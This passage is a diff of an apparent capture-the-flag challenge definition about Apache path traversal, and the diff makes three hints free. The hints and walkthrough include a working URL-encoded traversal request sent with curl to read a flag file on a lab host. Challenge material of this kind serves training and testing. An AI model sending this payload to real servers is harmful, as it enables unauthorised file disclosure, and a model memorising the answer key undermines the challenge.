@@ -12,10 +12,10 @@ hints:
   cost: 0
   body: Confirm the version with nmap -sV or the response headers.
 - level: 2
-  cost: 5
+  cost: 0
   body: Use URL-encoded .. traversal.
 - level: 3
-  cost: 10
+  cost: 0
   body: Target /cgi-bin/ or /icons/ if enabled.
 remediation: Patch Apache; disable unnecessary CGI; restrict filesystem access.
 walkthrough: curl --path-as-is "http://target.lab.local:8082/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt" returns
